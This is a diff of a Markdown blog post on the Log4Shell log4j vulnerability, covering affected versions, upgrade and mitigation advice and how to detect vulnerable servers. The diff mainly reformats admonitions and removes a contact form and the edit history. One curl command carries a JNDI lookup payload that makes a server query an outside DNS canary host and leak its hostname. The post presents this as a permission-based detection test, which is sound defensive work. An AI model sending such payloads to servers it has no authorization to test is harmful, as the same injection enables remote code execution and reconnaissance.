@@ -38,6 +38,9 @@ This post provides resources to help you understand the vulnerability and how to
 _This blog post is also available at https://log4shell.com/_
 
 
+
+
+
 ## Who is impacted?
 
 Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), as well as apps like
@@ -77,14 +80,14 @@ Almost all versions of log4j version 2 are affected.
 
 `2.0-beta9 <= Apache log4j <= 2.14.1`
 
-:::caution Limited vulnerabilities found in `2.15.0` and `2.16.0`
+Caution: Limited vulnerabilities found in `2.15.0` and `2.16.0`
 As of Tuesday, Dec 14, version `2.15.0` was found to still have a possible [vulnerability in some apps](https://lists.apache.org/thread/83y7dx5xvn3h5290q1twn16tltolv88f). And, a few days later, a DOS vulnerability was found in `2.16.0` too.
 
 ~~We recommend updating to `2.16.0` which [disables](https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea) JNDI and [completely removes](https://github.com/apache/logging-log4j2/pull/623) `%m{lookups}`.~~ (Updated: See below)
 
 We recommend updating to `2.17.0` which includes the fixes introduced in `2.16.0` as well as a fix for a [discovered denial
 of service (DOS) attack](https://logging.apache.org/log4j/2.x/security.html).
-:::
+
 ### log4j v1
 
 Version 1 of log4j is vulnerable to other RCE attacks, and if you're using it, you need to
@@ -103,11 +106,10 @@ The release can also be downloaded from the Apache Log4j [Download](https://logg
 
 **For Current Information:** Please read our follow-up guide on [log4j mitigation strategies](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide).
 
-:::warning `formatMsgNoLookups` Does not protect against all attacks
+Warning: `formatMsgNoLookups` Does not protect against all attacks
 As of Tuesday, Dec 14, it's been found that this flag is ineffective at stopping certain attacks, which is partially explained in
 [CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046).  
 You must update to `2.17.0`, or use the JNDI patches for temporary mitigation explained in [our mitigation guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
-:::
 
 As per [this discussion on HackerNews](https://news.ycombinator.com/item?id=29507263):
 
@@ -203,8 +205,8 @@ exploit payload that could be used for this vulnerability. You can refer to [thi
 
 ## How to identify vulnerable remote servers
 
-:::info Make sure that you have permission from the owner of the server being penetration tested.
-:::
+Note: 
+Make sure that you have permission from the owner of the server being penetration tested.
 
 The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above,
 the exploit will cause the vulnerable server to attempt to fetch some remote code.  By using the address
@@ -219,10 +221,10 @@ input to an HTTP header.  In our example above, the X-Api-Version header was bei
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
 ```
 
-:::info These requests may not be private
+Note: 
+These requests may not be private
 If you wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
 for testing.
-:::
 
 ## More information
 
@@ -249,43 +251,11 @@ automatically and quickly patches your live server's dependencies whenever a new
 For updates on Log4Shell, please follow us on [Twitter](https://twitter.com/LunaSecIO) or subscribe to our newsletter
 below.
 
-import ContactForm from '../src/components/ContactForm.jsx'
-
-<ContactForm/>
-
 ### Links
 
 - **[Hacker News](https://news.ycombinator.com/item?id=29504755)**
 - **[Reddit](https://old.reddit.com/r/programming/comments/rcxehp/rce_0day_exploit_found_in_log4j_a_popular_java/)**
 - **[Twitter](https://twitter.com/freeqaz/status/1469121757361569793?s=20)**
-
-### Edits
-
-1. Updated the "Who is impacted?" section to include mitigating factors based on JDK version, while also suggesting other exploitation
-   methods as still prevalent.
-2. ~~Named the vulnerability "LogJam"~~ Added CVE, and added link to release tags.
-3. Updated mitigation steps with newer information.
-4. Removed the name "LogJam" because it's already been [used](https://en.wikipedia.org/wiki/Logjam_(computer_security)). Using "Log4Shell" instead.
-5. Update that 2.15.0 is released.
-6. Added the MS Paint logo[4], and updated example code to be slightly more clear (it's not string concatenation).
-7. Reported on iPhones being affected by the vulnerability, and included local reproduction code and steps.
-8. Updated social info.
-9. Updated example code to use Log4j2 syntax.
-10. Updated title because of some confusion.
-11. Better DNS testing site and explanation
-12. Added link to the [Log4Shell Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/).
-13. Add warnings about limited vuln in 2.15 / noMsgFormatLookups
-14. Added link to 2nd CVE.
-15. Updated contact information.
-16. Updated original Twitter link from @P0rZ9 as the original tweet was deleted. Changed from `https://twitter.com/P0rZ9/status/1468949890571337731` to `https://web.archive.org/web/20211209230040/https://twitter.com/P0rZ9/status/1468949890571337731`.
-17. Added links to other blog posts.
-18. Updated post to include latest version 2.17.0 release.
-19. Updated archived Twitter link as the original has no images anymore. Changed from `20211209230040` to `20211211082351`.
-
-### Editing this post
-
-If you have any updates or edits you'd like to make, you can edit this post as Markdown on
-[GitHub](https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2021-12-09-log4j-zero-day.mdx). And please throw us a Star ⭐!
 
 ### References
 
